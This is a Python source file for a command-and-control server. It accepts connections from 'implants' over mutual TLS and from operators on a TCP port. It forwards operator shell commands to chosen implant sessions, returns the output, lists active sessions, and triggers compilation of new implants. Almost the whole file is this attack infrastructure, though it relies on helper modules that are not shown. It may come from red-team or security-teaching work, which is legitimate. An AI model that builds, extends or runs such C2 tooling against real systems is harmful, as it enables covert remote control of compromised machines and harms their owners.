#!/usr/bin/env python3
# TODO: Convert CLI to CMD2
import logging
import sys

from mtls import mtls
from generate.generate import generate
from queue import Queue
from handler.handler import Handler
from pb import operatorpb_pb2

import socket
import threading

class C2Server(object):
    connections = []

    def __init__(self):
        self.shutdown = 0
        logging.basicConfig(filename="Command Log.txt", level=logging.INFO)

        ## Generating stuff for implant comms ##
        print("Listening for implants...")
        self.requestq = Queue() #this is a shared queue between the handler and the listner, which fills with implant registration
        self.implantlistener = mtls.Listener(self.requestq) #begins implant listener w/ mtls encryption

        ## Generating stuff for operator comms ##
        print("Listening for operators...")
        self.clients = list()

        self.handler = Handler(self.requestq, self.clients)
        self.handler.start()

        self.host = ""
        self.port = 12345
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.host, self.port))

        threading.Thread(target=self._accept_client).start() #this is so we can listen and have execute commands from server console


    # Turn message into a protobuf Message and ssend to client
    def _send_client(self, message, client):
        response = operatorpb_pb2.ServerCmdOutput(cmdOutput=message)

        message = operatorpb_pb2.Message(
            message_type=operatorpb_pb2.Message.MessageType.ServerCmdOutput,
            data=response.SerializeToString()
        )

        client.send(message.SerializeToString())

    def _shell_session(self, command_str, session_id):
            conn, addr = self.implantlistener.sessions.get(session_id) 

            output = mtls.session(conn, command_str)

            response = operatorpb_pb2.SessionCmdOutput(cmdOutput=output, id=session_id)

            message = operatorpb_pb2.Message(
                message_type=operatorpb_pb2.Message.MessageType.SessionCmdOutput,
                data=response.SerializeToString()
            )

            return (message.SerializeToString())

    def _execute_command(self, command, client):
        #command is an array of strings
        if len(command) < 1:
            self._send_client("Please enter a command", client)
            return

        elif command[0] == "sessions":
            return str(self.implantlistener.sessions.list()).encode("ascii")

        # Compile an implant
        elif command[0] == "generate":
            print("Generating the implant...")
            generate(self.implantlistener.client_certs)

        else:
            return(b"Unknown Command")

    def _accept_client(self):
        numberOfUsers = 5
        self.sock.listen(numberOfUsers)
        while True: #keep listening, start a new thread when a client connects
            client, address = self.sock.accept()

            self.clients.append(client)
            self.handler.brodcastImplants(client)

            print("[+]Connected to a new client at " + address[0] + ":" + str(address[1]) )
            threading.Thread(target = self._listen_client,args = (client,address)).start()
            self.connections.append(address) 

    def _listen_client(self, client, address):
        size = 1024
        while True:
            data = client.recv(size)

            message = operatorpb_pb2.Message()
            message.ParseFromString(data)

            if message.message_type==operatorpb_pb2.Message.MessageType.SessionCmd:
                session_cmd = operatorpb_pb2.SessionCmd()
                session_cmd.ParseFromString(message.data)

                command_str = session_cmd.cmd
                session_id = session_cmd.id

                #TODO: proper error handling
                if session_id not in self.implantlistener.sessions.list():
                    self._send_client(b"Session doesn't exist", client)
                else:
                    out = self._shell_session(command_str, session_id)
                    client.send(out)


            elif message.message_type==operatorpb_pb2.Message.MessageType.ServerCmd:
                server_cmd = operatorpb_pb2.ServerCmd()
                server_cmd.ParseFromString(message.data)
                command_str = server_cmd.cmd.lower()

                logging.info("Command: " + command_str)

                if (command_str != "exit"):
                    response = self._execute_command(command_str.split(), client)
                    if response:
                        self._send_client(response, client)
                else:
                    print("[+]Disconnected client " + address[0] +":"+ str(address[1]))
                    client.close()
                    self.clients.remove(client)
                    break

def main():
    C2Server()

if __name__ == "__main__":
    main()
